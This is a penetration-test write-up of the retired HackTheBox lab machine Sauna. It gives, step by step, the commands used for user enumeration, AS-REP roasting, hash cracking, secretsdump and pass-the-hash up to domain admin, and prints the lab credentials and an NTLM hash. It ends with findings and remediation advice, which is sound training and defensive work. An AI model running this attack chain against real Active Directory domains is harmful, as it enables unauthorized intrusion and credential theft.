# HTB Sauna - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-2-26

---

## 0. Lesson Learned

No visible path in BloodHound does NOT mean no escalation path exists. It only means no graph-based privilege abuse path exists.

Systematically turn credentials into better credentials. 

- When you have a user list -> AS-REP check (`GetNPUsers.py`). 
- When you have first credentials -> Kerberoast (`GetUserSPNs.py`). 
- When you find service or privileged creds -> `secretsdump.py`.

---

## 1. Executive Summary

During the assessment of the target host, multiple critical misconfigurations were identified within the Active Directory environment. These weaknesses allowed unauthorized domain user access via Kerberos AS-REP roasting, credential harvesting from system configuration, and ultimately full Domain Administrator compromise through credential extraction.

The domain was fully compromised, and SYSTEM-level access was obtained on the Domain Controller.

---

## 2. Scope

- **Target:** 10.129.95.180
- **Domain:** EGOTISTICAL-BANK.LOCAL
- **Environment:** HackTheBox Sauna (Retired Machine)
- **Testing Window:** 2026-2-26 to 2016-2-26
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Port Scan:

```
nmap -p- -sCV 10.129.95.180 -T4 -oA sauna_tcp
```

Key services identified:

- 80/tcp - HTTP - IIS 10.0
- 88/tcp - Kerberos
- 445/tcp - SMB
- 389/tcp - LDAP
- 5985/tcp - WinRM
- 3268/tcp - Global Catalog LDAP

---

## 5. Enumeration

Anonymous LDAP bind successful but did not reveal users directly:

```
ldapsearch -x -H ldap://10.129.95.180 -b "DC=EGOTISTICAL-BANK,DC=LOCAL" "(objectClass=user)"
```

Usernames were generated manually from the company website following AD convention. Username enumeration performed using Kerberos:

```
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.95.180 usernames.txt
```

Valid user `FSmith` discovered.

---

## 6. Initial Access

AS-REP roasting was performed:

```
GetNPUsers.py -no-pass -dc-ip 10.129.95.180 EGOTISTICAL-BANK.LOCAL/FSmith
```

AS-REP hash obtained and cracked with hashcat:

```
hashcat -m 18200 asrep23.hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

Recovering the credentials:

```
FSmith : Thestrokes23
```

WinRM access achieved:

```
evil-winrm -i 10.129.95.180 -u FSmith -p Thestrokes23
```

User-level shell obtained.

---

## 7. Post-Exploitation

Domain enumeration performed using BloodHound:

```
bloodhound-python -d EGOTISTICAL-BANK.LOCAL -u FSmith -p Thestrokes23 -dc SAUNA.EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All --zip
```

No direct privilege escalation path identified.

Local enumeration was performed using winPEAS:

```
upload winPEASx64.exe

./winPEASx64.exe
```

Autologon credentials discovered:

```
svc_loanmgr : Moneymakestheworldgoround!
```

---

## 8. Privilege Escalation

Administrator NTLM hash recovered from secrets dump:

```
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180'
```

Pass-the-hash attack:

```
evil-winrm -i 10.129.95.180 -u Administrator --hash 823452073d75b9d1cf70ebdf86c7f98e
```

Resulted in SYSTEM-level shell access.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\FSmith\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full domain compromise.

---

## 10. Findings & Recommendations

### **Finding:** Weak Domain Password Policy

**Severity:** High

**Description:**
The domain password policy allowed weak or easily guessable passwords that could be cracked using common wordlists.

**Impact:**
Attackers could recover user credentials through offline cracking or password spraying, potentially leading to privilege escalation.

**Recommendation:**
Enforce strong password complexity requirements, implement account lockout policies, and monitor for excessive authentication attempts.

### **Finding:** Autologon Credentials Stored in Registry

**Severity:** Critical

**Description:**
Autologon credentials were stored in the Windows registry, allowing retrieval of plaintext service account credentials.

**Impact:**
Attackers with local access could extract credentials and escalate privileges or move laterally within the domain.

**Recommendation:**
Remove stored autologon credentials, disable automatic logon functionality where unnecessary, and implement LAPS or managed service accounts.

### **Finding:** Excessive Privileges Assigned to Service Account

**Severity:** Critical

**Description:**
A service account was granted excessive domain privileges beyond operational requirements.

**Impact:**
Attackers compromising the account could perform privileged actions such as dumping domain secrets or escalating to domain administrator.

**Recommendation:**
Review service account privileges, remove unnecessary rights, and apply the principle of least privilege. Regularly audit privileged group memberships.

### **Finding:** AS-REP Roastable Service Account

**Severity:** Critical

**Description:**
A service account was configured without Kerberos preauthentication enabled, making it vulnerable to AS-REP roasting attacks.

**Impact:**
Attackers could request authentication material and perform offline password cracking without valid domain credentials, potentially leading to privilege escalation.

**Recommendation:**
Enforce Kerberos preauthentication for all accounts, audit for accounts with the UF_DONT_REQUIRE_PREAUTH flag set, and ensure strong, complex passwords are used for service accounts.

---

## 11. Appendix

File Upload Guide for Evil-WinRM -
[https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)